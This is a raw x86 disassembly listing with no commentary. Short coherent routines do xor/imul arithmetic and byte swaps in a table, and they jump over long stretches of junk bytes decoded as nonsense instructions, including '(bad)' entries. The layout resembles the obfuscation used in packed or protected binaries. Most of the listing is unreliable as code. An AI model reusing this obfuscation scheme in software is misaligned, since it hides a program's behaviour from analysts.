  408437:	jnp    0x40841f
  408439:	test   esi,ebp
  40843b:	ficom  WORD PTR [esi-0xf]
  40843e:	sti    
  40843f:	lahf   
  408440:	dec    edi
  408441:	loop   0x408464
  408443:	int3   
  408444:	inc    edx
  408445:	test   DWORD PTR [edi-0x57074c0a],edi
  40844b:	ret    0x64f9
  40844e:	xor    edi,DWORD PTR [ecx+0x31]
  408451:	out    dx,eax
  408452:	leave  
  408453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408454:	and    al,0x33
  408456:	retf   0xdead
  408459:	and    al,0x3a
  40845b:	pusha  
  40845c:	mov    ecx,0x63048101
  408461:	inc    esi
  408462:	cmp    ebp,DWORD PTR [edx+edi*1]
  408465:	pop    edi
  408466:	mov    esi,0x89556b28
  40846b:	jo     0x40849d
  40846d:	ror    DWORD PTR [eax+0x893a922],0x2b
  408474:	inc    ecx
  408475:	adc    DWORD PTR [ebp+0xa],ebx
  408478:	pop    esp
  408479:	ror    ebx,1
  40847b:	pop    edi
  40847c:	push   ds
  40847d:	(bad)  
  40847e:	jns    0x408410
  408480:	outs   dx,BYTE PTR ds:[esi]
  408481:	adc    BYTE PTR [ecx+0xc],ah
  408484:	gs pop eax
  408486:	pop    ds
  408487:	mov    dh,BYTE PTR [ebx+0x11f17167]
  40848d:	(bad)  
  40848e:	repz dec ebp
  408490:	xor    DWORD PTR [esi+0x25],ebx
  408493:	in     eax,0xf3
  408495:	bound  ecx,QWORD PTR [edi]
  408497:	outs   dx,DWORD PTR ds:[esi]
  408498:	jae    0x4084ac
  40849a:	xchg   BYTE PTR [esi],al
  40849c:	jns    0x408481
  40849e:	mov    edx,0x2115c4fd
  4084a3:	aad    0xaa
  4084a5:	jge    0x4084dd
  4084a7:	daa    
  4084a8:	dec    ebx
  4084a9:	adc    bh,BYTE PTR [ebx-0x2c]
  4084ac:	bound  ecx,QWORD PTR [esp+eax*1-0x4deeb0bb]
  4084b3:	dec    eax
  4084b4:	adc    eax,0x105f334d
  4084b9:	xchg   BYTE PTR [ebx],dl
  4084bb:	mov    dl,0x9d
  4084bd:	or     edi,esp
  4084bf:	cmp    bh,dh
  4084c1:	sub    eax,0x49b5e121
  4084c6:	inc    ebp
  4084c7:	aas    
  4084c8:	scas   eax,DWORD PTR es:[edi]
  4084c9:	cmp    ah,BYTE PTR [esi-0x694bb5b]
  4084cf:	sub    al,0x4f
  4084d1:	xchg   eax,eax
  4084d3:	ja     0x40848d
  4084d5:	adc    eax,DWORD PTR [esi-0x71]
  4084d8:	in     al,0x4e
  4084da:	clc    
  4084db:	pop    esi
  4084dc:	sub    DWORD PTR [ecx],0x11996d7a
  4084e2:	and    al,0x2
  4084e4:	test   eax,0x7d6f9470
  4084e9:	pusha  
  4084ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084eb:	push   0xc2863f5f
  4084f0:	les    edx,FWORD PTR [ebx+0x742a980]
  4084f6:	xchg   edx,eax
  4084f7:	ja     0x4084ab
  4084f9:	and    DWORD PTR [edx+0x30],eax
  4084fc:	ins    DWORD PTR es:[edi],dx
  4084fd:	lock ds xchg edx,eax
  408500:	adc    ah,BYTE PTR [edi+0x3179d3ad]
  408506:	sub    DWORD PTR [edx+0x53debb6e],ebp
  40850c:	cwde   
  40850d:	cmp    DWORD PTR [ecx+0x6dd1a602],0x2766c6a4
  408517:	mov    edx,0x53416bde
  40851c:	push   0xffffff8d
  40851e:	jg     0x40854f
  408520:	sbb    DWORD PTR [eax-0x4a],esp
  408523:	ror    BYTE PTR ds:0x41037a97,1
  408529:	in     eax,dx
  40852a:	inc    ecx
  40852b:	outs   dx,BYTE PTR ds:[esi]
  40852c:	adc    edi,ebp
  40852e:	in     al,dx
  40852f:	in     eax,0xe7
  408531:	stc    
  408532:	adc    cl,BYTE PTR [ecx-0x69]
  408535:	mov    ah,bh
  408537:	mov    edx,0x4d358e4e
  40853c:	imul   edi,DWORD PTR [edi+0x3d],0x3a
  408540:	inc    ebp
  408541:	repz xor ebx,DWORD PTR [esi+0x1a9aa80c]
  408548:	call   0xd35:0x36faa90e
  40854f:	jo     0x4084eb
  408551:	pop    ss
  408552:	jp     0x408517
  408554:	clc    
  408555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408556:	ficomp WORD PTR [ecx+0x78]
  408559:	push   cs
  40855a:	sub    eax,0x5c35d036
  40855f:	xlat   BYTE PTR ds:[ebx]
  408560:	mov    BYTE PTR [edi+0x79],dl
  408563:	dec    ebx
  408564:	pop    edx
  408565:	enter  0x8d8f,0x5e
  408569:	cdq    
  40856a:	sbb    ecx,DWORD PTR [esi]
  40856c:	lds    ecx,FWORD PTR [ecx]
  40856e:	stos   DWORD PTR es:[edi],eax
  40856f:	xchg   BYTE PTR [edi],al
  408571:	inc    ebp
  408572:	sbb    eax,0xa0cfca2c
  408577:	inc    edx
  408578:	sbb    BYTE PTR [ebx+0x1d],0x10
  40857c:	or     BYTE PTR [esi],cl
  40857e:	in     eax,dx
  40857f:	inc    esp
  408580:	xor    BYTE PTR [esi],0x72
  408583:	shl    DWORD PTR [edx+0x3b751497],1
  408589:	fimul  DWORD PTR [edi]
  40858b:	xchg   DWORD PTR [eax],ecx
  40858d:	add    BYTE PTR [eax],al
  40858f:	add    BYTE PTR [ebx-0x271633ab],cl
  408595:	add    DWORD PTR [eax],eax
  408597:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40859d:	cld    
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x6ca9353f
  4085c4:	jbe    0x4085ab
  4085c6:	loope  0x40859f
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x40856f
  4085cf:	mov    WORD PTR [ecx-0x6eec2524],es
  4085d5:	out    dx,eax
  4085d6:	test   DWORD PTR [esi+0x28],esi
  4085d9:	push   0xffffffbb
  4085db:	xor    eax,0x9520a01f
  4085e0:	cwde   
  4085e1:	mov    eax,0x868a8882
  4085e6:	mov    ecx,0xc0d62089
  4085eb:	or     edx,eax
  4085ed:	add    eax,0xabe4082c
  4085f2:	xor    cl,cl
  4085f4:	scas   al,BYTE PTR es:[edi]
  4085f5:	sbb    eax,0xdbf3c9fd
  4085fa:	faddp  st(7),st
  4085fc:	loopne 0x40864a
  4085fe:	iret   
  4085ff:	mov    edi,0x4dd33075
  408604:	js     0x4085f6
  408606:	bound  ebx,QWORD PTR [esi+0x3bb527e6]
  40860c:	jno    0x40862b
  40860e:	mov    esp,0x1d87f9f0
  408613:	jle    0x4085a0
  408615:	dec    edx
  408616:	fimul  WORD PTR [edx]
  408618:	loopne 0x40861b
  40861a:	lods   eax,DWORD PTR ds:[esi]
  40861b:	push   ds
  40861c:	pop    ebp
  40861d:	cdq    
  40861e:	cmc    
  40861f:	jle    0x408669
  408621:	dec    ebx
  408622:	dec    esp
  408623:	nop
  408624:	add    DWORD PTR [edx+0xb],eax
  408627:	mov    al,BYTE PTR [edx+edi*2+0x58]
  40862b:	out    dx,eax
  40862c:	inc    esi
  40862d:	dec    eax
  40862e:	push   esi
  40862f:	pop    ss
  408630:	mov    bl,0x4e
  408632:	jne    0x4085d6
  408634:	div    DWORD PTR [eax]
  408636:	sub    al,0xd6
  408638:	jae    0x4085ee
  40863a:	cmp    DWORD PTR [edx-0x62],esi
  40863d:	or     BYTE PTR [ebp+0x5d89876c],0x8d
  408644:	ss mov ebx,0x55ac0ea0
  40864a:	in     eax,dx
  40864b:	cwde   
  40864c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40864d:	jno    0x40868d
  40864f:	jo     0x408680
  408651:	test   eax,0x5cd1aa17
  408656:	rol    DWORD PTR [eax],cl
  408658:	lock popf 
  40865a:	mov    al,ds:0x56fd4917
  40865f:	add    al,0x3f
  408661:	pop    edi
  408662:	push   ebp
  408663:	mov    al,ds:0xd856f626
  408668:	add    DWORD PTR [ebp-0x12],eax
  40866b:	xlat   BYTE PTR ds:[ebx]
  40866c:	xor    BYTE PTR [esi+ecx*1],dh
  40866f:	inc    esi
  408670:	imul   ebx,DWORD PTR [ebx+0x66d7079a],0xd224aa6
  40867a:	add    ah,BYTE PTR [edx+0x5de1eb79]
  408680:	in     al,0xde
  408682:	add    cl,BYTE PTR [edi-0x31eba0f0]
  408688:	mov    esp,gs
  40868a:	mov    edi,0x1752d71c
  40868f:	sub    eax,0x483405ad
  408694:	mov    esp,0xbbfaba9f
  408699:	or     DWORD PTR [ebx],eax
  40869b:	jl     0x408710
  40869d:	pop    ss
  40869e:	outs   dx,BYTE PTR ds:[esi]
  40869f:	or     DWORD PTR [edx],edi
  4086a1:	mov    dh,cl
  4086a3:	mov    DWORD PTR [edx+0x5d],ecx
  4086a6:	dec    eax
  4086a7:	fsubr  QWORD PTR [ebp-0x58100044]
  4086ad:	adc    eax,0x5031d38b
  4086b2:	sub    al,0x9a
  4086b4:	js     0x408639
  4086b6:	xor    BYTE PTR [ebx],0x6
  4086b9:	push   ecx
  4086ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086bb:	add    BYTE PTR [ecx],dl
  4086bd:	int3   
  4086be:	and    DWORD PTR ds:0x4905407c,edi
  4086c4:	mov    ?,WORD PTR [edx]
  4086c6:	scas   al,BYTE PTR es:[edi]
  4086c7:	sar    DWORD PTR [esi+0x69],0x8
  4086cb:	(bad)  
  4086cc:	ja     0x408654
  4086ce:	sub    DWORD PTR [bx+di-0x20],eax
  4086d2:	out    0x2e,al
  4086d4:	push   esi
  4086d5:	inc    esp
  4086d6:	mov    ecx,0xda393aef
  4086db:	outs   dx,DWORD PTR ds:[esi]
  4086dc:	jae    0x408680
  4086de:	ins    BYTE PTR es:[edi],dx
  4086df:	adc    DWORD PTR [edx-0x68e2c29a],esp
  4086e5:	cmp    al,0x52
  4086e7:	aad    0xb4
  4086e9:	and    eax,0x25429668
  4086ee:	cmp    bh,BYTE PTR [esi]
  4086f0:	(bad)  
  4086f1:	mov    bl,0x93
  4086f3:	retf   0xa255
  4086f6:	aad    0xb9
  4086f8:	jle    0x408707
  4086fa:	push   esp
  4086fb:	and    DWORD PTR [esi-0x76c18e73],eax
  408701:	xor    ah,BYTE PTR [ebp+0x11526939]
  408707:	out    dx,eax
  408708:	iret   
  408709:	sub    eax,0x54c8b6cb
  40870e:	loop   0x4086e9
  408710:	push   ecx
  408711:	rol    ecx,cl
  408713:	mov    esi,0xf161f900
  408718:	(bad)
  40871c:	xor    edi,DWORD PTR [edi-0x1498b0d]
  408722:	push   eax
  408723:	jne    0x408774
  408725:	test   al,0xff
  408727:	arpl   WORD PTR [edx+eax*8],si
  40872a:	jge    0x4086e4
  40872c:	xchg   edx,eax
  40872d:	sbb    al,0x6b
  40872f:	mov    ebp,0xf908e0db
  408734:	lahf   
  408735:	add    esp,ebx
  408737:	fisttp QWORD PTR [edi]
  408739:	(bad)  
  40873a:	test   eax,0x88a38816
  40873f:	sbb    edi,esp
  408741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408742:	mov    cl,BYTE PTR [esi+0x4564be95]
  408748:	hlt    
  408749:	push   edx
  40874a:	inc    edx
  40874b:	sub    eax,0x5803395
  408750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408751:	or     BYTE PTR [eax-0x19fa83d4],bh
  408757:	adc    al,0x95
  408759:	xchg   edx,eax
  40875a:	fnsetpm(287 only) 
  40875c:	jne    0x40875f
  40875e:	cmp    DWORD PTR [ebp-0x25c46d63],esp
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	into   
  408848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408849:	int3   
  40884a:	enter  0xd57d,0x7e
  40884e:	jle    0x4087da
  408850:	jg     0x4088d0
  408852:	jle    0x408808
  408854:	jmp    0x408806
  408856:	je     0x408862
  408858:	add    esp,DWORD PTR [ecx]
  40885a:	sbb    DWORD PTR [edx],ecx
  40885c:	arpl   WORD PTR [esi],ax
  40885e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885f:	lods   al,BYTE PTR ds:[esi]
  408860:	xchg   edi,eax
  408861:	sub    ah,0x2a
  408864:	jmp    0x488d:0xaddd9cb7
  40886b:	imul   BYTE PTR [edi-0x33]
  40886e:	data16 fidiv WORD PTR [edi-0x1cad609]
  408875:	xor    al,0x42
  408877:	in     eax,dx
  408878:	sbb    DWORD PTR [esp+eiz*4-0x39],0xfae88b0e
  408880:	mov    ah,bl
  408882:	(bad)  
  408884:	mov    BYTE PTR [eax+eax*4],al
  408887:	inc    ebx
  408888:	mov    WORD PTR [edx-0x299e69ec],?
  40888e:	jo     0x40883a
  408890:	and    DWORD PTR [esi-0x33],ebp
  408893:	jnp    0x408914
  408895:	xor    eax,0xc314448b
  40889a:	add    BYTE PTR [edx+0x5b],bl
  40889d:	or     DWORD PTR [ebx],edx
  40889f:	arpl   WORD PTR [esi-0x38],bp
  4088a2:	xor    edi,DWORD PTR [ebx+0x5c]
  4088a5:	dec    eax
  4088a6:	iret   
  4088a7:	hlt    
  4088a8:	pop    edx
  4088a9:	or     al,0x11
  4088ab:	mov    ds,WORD PTR [edx]
  4088ad:	repnz adc eax,0xcb50e48f
  4088b3:	sub    eax,0x58b3d1ef
  4088b8:	fdivr  DWORD PTR [edx-0x6c]
  4088bb:	addr16 loop 0x40891e
  4088be:	mov    ds:0xcf26fa5e,eax
  4088c3:	out    dx,al
  4088c4:	pop    esp
  4088c5:	cvttps2pi mm4,QWORD PTR [esi+0x7d]
  4088c9:	add    ecx,DWORD PTR [ecx+0x38]
  4088cc:	push   ecx
  4088cd:	adc    eax,0xe66bb916
  4088d2:	mov    bh,0x9b
  4088d4:	jnp    0x40889e
  4088d6:	sbb    esi,ebx
  4088d8:	mov    ds:0x1ccc7b54,eax
  4088dd:	pop    ss
  4088de:	inc    esi
  4088df:	add    al,0xc3
  4088e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e2:	pushf  
  4088e3:	ret    0x8e8
  4088e6:	inc    edi
  4088e7:	xchg   ecx,eax
  4088e8:	out    dx,al
  4088e9:	xchg   esi,eax
  4088ea:	xlat   BYTE PTR ds:[ebx]
  4088eb:	adc    bh,BYTE PTR [esp+ebp*4]
  4088ee:	(bad)  [ebp+0x643a9bb]
  4088f4:	ss jmp ebx
  4088f7:	ins    DWORD PTR es:[edi],dx
  4088f8:	mov    al,ds:0x4d450f67
  4088fd:	mov    ds:0x88cd81be,eax
  408902:	sub    BYTE PTR [esi+0x16],cl
  408905:	stc    
  408906:	pop    ebp
  408907:	pop    ecx
  408908:	test   DWORD PTR [esi+0x21e6a6d3],esp
  40890e:	push   0x39
  408910:	or     al,0xee
  408912:	sahf   
  408913:	(bad)  
  408915:	mov    ds:0xf3ec8a6d,eax
  40891a:	popa   
  40891b:	(bad)  
  40891c:	out    dx,eax
  40891d:	test   al,0x17
  40891f:	cdq    
  408920:	daa    
  408921:	aaa    
  408922:	mov    ds:0xc4d264e8,al
  408927:	sub    ebp,esi
  408929:	add    DWORD PTR [ebx],esi
  40892b:	push   edx
  40892c:	out    0xd3,al
  40892e:	rcr    bh,0x54
  408931:	mov    cl,0xb1
  408933:	test   ah,al
  408935:	cmp    eax,0xa1da0d93
  40893a:	daa    
  40893b:	xchg   ebp,eax
  40893c:	imul   ebp,DWORD PTR [edx+edi*8+0x48],0x51
  408941:	xchg   esp,eax
  408942:	ret    
  408943:	mov    ch,0x1f
  408945:	cmc    
  408946:	(bad)  
  408947:	mov    esp,0x429dc24b
  40894c:	int    0x31
  40894e:	aas    
  40894f:	test   al,0x8c
  408951:	push   esp
  408952:	(bad)  
  408953:	fcmovne st,st(7)
  408955:	out    0x46,al
  408957:	cwde   
  408958:	cmp    BYTE PTR [esi+edx*4-0x3b],0xc4
  40895d:	mov    ds:0xd1ba5253,al
  408962:	in     eax,0x44
  408964:	bound  ebx,QWORD PTR [edi-0x7d]
  408967:	jecxz  0x408989
  408969:	dec    esi
  40896a:	mov    bl,0x1e
  40896c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40896d:	jecxz  0x408952
  40896f:	jecxz  0x4089ef
  408971:	add    DWORD PTR [esp+edi*8+0x6e],ebx
  408975:	dec    eax
  408976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408977:	add    al,0xc5
  408979:	hlt    
  40897a:	nop
  40897b:	sub    al,0x52
  40897d:	push   ebx
  40897e:	sbb    ch,BYTE PTR [esi-0x6a6dc4dd]
  408984:	and    DWORD PTR [ecx-0x25],0xa20f5b23
  40898b:	mov    al,ds:0x365218
  408990:	jecxz  0x4089a9
  408992:	arpl   WORD PTR [edi-0x50d1b1d2],sp
  408998:	jb     0x408952
  40899a:	nop
  40899b:	aas    
  40899c:	call   DWORD PTR [edx]
  40899e:	add    al,0x19
  4089a0:	sub    al,0x8b
  4089a2:	inc    ebx
  4089a3:	out    0x2d,al
  4089a5:	lods   al,BYTE PTR ds:[esi]
  4089a6:	outs   dx,DWORD PTR ds:[esi]
  4089a7:	sub    eax,0x1e1c072b
  4089ac:	popa   
  4089ad:	pop    ecx
  4089ae:	pop    ecx
  4089af:	dec    eax
  4089b0:	cmc    
  4089b1:	dec    ebp
  4089b2:	pushf  
  4089b3:	imul   esp,DWORD PTR [ebx+edx*8],0xffffffd8
  4089b7:	stc    
  4089b8:	rcl    DWORD PTR [ebx+eax*4],0x50
  4089bc:	dec    edx
  4089bd:	or     al,dl
  4089bf:	xchg   ecx,eax
  4089c0:	repz (bad) 
  4089c2:	mov    esp,0x10271587
  4089c7:	arpl   WORD PTR [edi+0xb],cx
  4089ca:	sub    DWORD PTR [eax+0xf],edx
  4089cd:	xor    ecx,ebp
  4089cf:	add    esi,DWORD PTR [ecx]
  4089d1:	push   edi
  4089d2:	jae    0x408991
  4089d4:	(bad)  
  4089d5:	cmc    
  4089d6:	gs inc edx
  4089d8:	jne    0x4089b7
  4089da:	sub    eax,0x9b57927c
  4089df:	mov    WORD PTR [edx-0x3b47881c],ss
  4089e5:	je     0x4089ad
  4089e7:	xor    edi,eax
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	jmp    0x40898f
  408a08:	push   ecx
  408a09:	add    cl,BYTE PTR [ecx-0x7581812e]
  408a0f:	jg     0x408a8f
  408a11:	jle    0x4089d3
  408a13:	pop    edi
  408a14:	neg    DWORD PTR ds:[edx+ecx*4]
  408a18:	pushf  
  408a19:	xor    BYTE PTR [esi+0x712db50e],dh
  408a1f:	es or  dl,BYTE PTR cs:[esi+ebx*4+0x6630d11b]
  408a28:	sbb    BYTE PTR ss:[ebp+0x47],0x2
  408a2d:	adc    al,0xab
  408a2f:	arpl   WORD PTR [edx+0x2a7289b3],cx
  408a35:	retf   0x15ac
  408a38:	jmp    0x6592:0xe3c050b6
  408a3f:	aad    0x45
  408a41:	rcl    DWORD PTR [eax+0x28dafdfe],1
  408a47:	(bad)  
  408a48:	mul    DWORD PTR [ebp-0x515c0220]
  408a4e:	fs pop esp
  408a50:	sbb    ah,0x6b
  408a53:	out    0x55,eax
  408a55:	loop   0x408a79
  408a57:	loope  0x408a5e
  408a59:	lock sbb al,0x30
  408a5c:	lds    esp,FWORD PTR [ecx+edx*2+0x24]
  408a60:	pop    ecx
  408a61:	ret    0x69fc
  408a64:	repz (bad) 
  408a66:	lock dec ebp
  408a68:	inc    edx
  408a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a6a:	fidiv  WORD PTR [esi-0x2e47844c]
  408a70:	scas   al,BYTE PTR es:[edi]
  408a71:	std    
  408a72:	jg     0x4089f7
  408a74:	pusha  
  408a75:	sbb    DWORD PTR ds:0xd4324e0b,0x8ac45fc4
  408a7f:	pop    ds
  408a80:	pop    esi
  408a81:	cmp    cl,bh
  408a83:	ja     0x408a72
  408a85:	inc    ebx
  408a86:	icebp  
  408a87:	mov    es,WORD PTR [esi]
  408a89:	add    eax,DWORD PTR es:[ebp-0x72dc1aba]
  408a90:	dec    esi
  408a91:	lea    esp,[ebx+0x5887df]
  408a97:	(bad)  
  408a98:	call   0x4b5:0xc81f4c96
  408a9f:	pop    ecx
  408aa0:	mov    eax,es
  408aa2:	jle    0x408ab4
  408aa4:	jo     0x408b13
  408aa6:	(bad)  
  408aa7:	retf   
  408aa8:	cwde   
  408aa9:	mul    BYTE PTR [esp+edx*1+0x203e65e3]
  408ab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ab1:	retf   0xfe35
  408ab4:	mov    eax,ds:0x35f95631
  408ab9:	pop    esp
  408aba:	mov    esi,esp
  408abc:	or     edx,ebp
  408abe:	and    edx,DWORD PTR [edx]
  408ac0:	lock outs dx,DWORD PTR ds:[esi]
  408ac2:	data16 into 
  408ac4:	adc    ch,al
  408ac6:	push   ds
  408ac7:	mov    ds:0xd35c6754,al
  408acc:	jg     0x408afe
  408ace:	xchg   ebx,eax
  408acf:	cdq    
  408ad0:	jb     0x408b26
  408ad2:	jge    0x408b24
  408ad4:	cs mov dh,0x0
  408ad7:	out    0x8,al
  408ad9:	popa   
  408ada:	inc    ebp
  408adb:	sub    esp,DWORD PTR ds:0xf53c
  408ae0:	stc    
  408ae1:	(bad)  
  408ae3:	adc    ecx,DWORD PTR [eax+0x3a46cbdd]
  408ae9:	es pop es
  408aeb:	mov    ds:0x8d5cad24,al
  408af0:	jg     0x408b00
  408af2:	and    eax,0xeebcab89
  408af7:	jb     0x408b0a
  408af9:	sbb    al,0x28
  408afb:	scas   eax,DWORD PTR es:[edi]
  408afc:	mov    bh,0x3c
  408afe:	in     al,dx
  408aff:	fwait
  408b00:	jg     0x408ac0
  408b02:	xchg   edx,eax
  408b03:	shl    BYTE PTR [edi],1
  408b05:	je     0x408ada
  408b07:	jmp    0xf9d2:0x72d6add1
  408b0e:	pop    ebx
  408b0f:	jle    0x408ac0
  408b11:	adc    BYTE PTR [esi+0x6e],0xa1
  408b15:	or     eax,0x537c1ff3
  408b1a:	mov    esp,0x6e31020
  408b1f:	daa    
  408b20:	scas   eax,DWORD PTR es:[edi]
  408b21:	(bad)  
  408b24:	outs   dx,BYTE PTR ds:[esi]
  408b25:	imul   edx,edi,0xffffff95
  408b28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b29:	push   cs
  408b2a:	repnz aad 0x1f
  408b2d:	ss scas eax,DWORD PTR es:[edi]
  408b2f:	jmp    0xc513acb4
  408b34:	push   0x76882ede
  408b39:	push   edx
  408b3a:	xchg   esp,eax
  408b3b:	add    cl,BYTE PTR [ebx+0x7b]
  408b3e:	cmp    BYTE PTR [edi],0x3f
  408b41:	sti    
  408b42:	dec    esi
  408b43:	jle    0x408b28
  408b45:	jl     0x408b61
  408b47:	outs   dx,BYTE PTR ds:[esi]
  408b48:	cmp    BYTE PTR [edi-0x4d839845],ch
  408b4e:	pushf  
  408b4f:	jae    0x408bc1
  408b51:	cmp    al,0x2b
  408b53:	xchg   ebp,eax
  408b54:	mov    dl,0xed
  408b56:	(bad)  
  408b57:	out    0xf1,eax
  408b59:	ret    0xdfe1
  408b5c:	scas   al,BYTE PTR es:[edi]
  408b5d:	sub    ch,ch
  408b5f:	cmp    BYTE PTR [edx+0x3ceda679],bh
  408b65:	dec    edx
  408b66:	call   0xb50f:0x28cee69d
  408b6d:	lods   al,BYTE PTR ds:[esi]
  408b6e:	xlat   BYTE PTR ds:[ebx]
  408b6f:	adc    ebx,DWORD PTR [ebp+0x7c9f0a42]
  408b75:	push   esi
  408b76:	lock outs dx,DWORD PTR ds:[esi]
  408b78:	mov    cl,0x55
  408b7a:	mov    dh,BYTE PTR [eax+edi*8]
  408b7d:	(bad)  
  408b7e:	lock and ax,0x35d8
  408b83:	in     eax,0x99
  408b85:	inc    esi
  408b86:	hlt    
  408b87:	bound  esp,QWORD PTR [eax-0x19bfca7a]
  408b8d:	leave  
  408b8e:	in     eax,dx
  408b8f:	iret   
  408b90:	retf   0x3ca
  408b93:	adc    al,0x7b
  408b95:	jmp    0x3cfdf31c
  408b9a:	out    0x85,eax
  408b9c:	dec    ebx
  408b9d:	jmp    0xefa9:0x4c2273c3
  408ba4:	mov    ebx,0x1fbc8de7
  408ba9:	fwait
  408baa:	jb     0x408bde
  408bac:	add    BYTE PTR [ebx],bh
  408bae:	cli    
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	inc    edx
  408bd9:	cdq    
  408bda:	dec    edi
  408bdb:	ret    
  408bdc:	and    eax,0x8a7e7ed0
  408be1:	jg     0x408c61
  408be3:	jle    0x408c14
  408be5:	pusha  
  408be6:	mov    BYTE PTR [esi],bh
  408be8:	push   esi
  408be9:	cwde   
  408bea:	(bad)  
  408beb:	jg     0x408bc6
  408bed:	jmp    0x37b80557
  408bf2:	out    dx,al
  408bf3:	xor    BYTE PTR [ebx+edx*8-0x2b],cl
  408bf7:	shr    DWORD PTR [edi+0x6212e420],1
  408bfd:	xchg   DWORD PTR [eax+0x3ae6b120],ecx
  408c03:	repnz aad 0xcf
  408c06:	cmp    al,BYTE PTR [ecx]
  408c08:	mov    eax,ds:0x15a0ae67
  408c0d:	in     al,dx
  408c0e:	inc    esi
  408c0f:	dec    eax
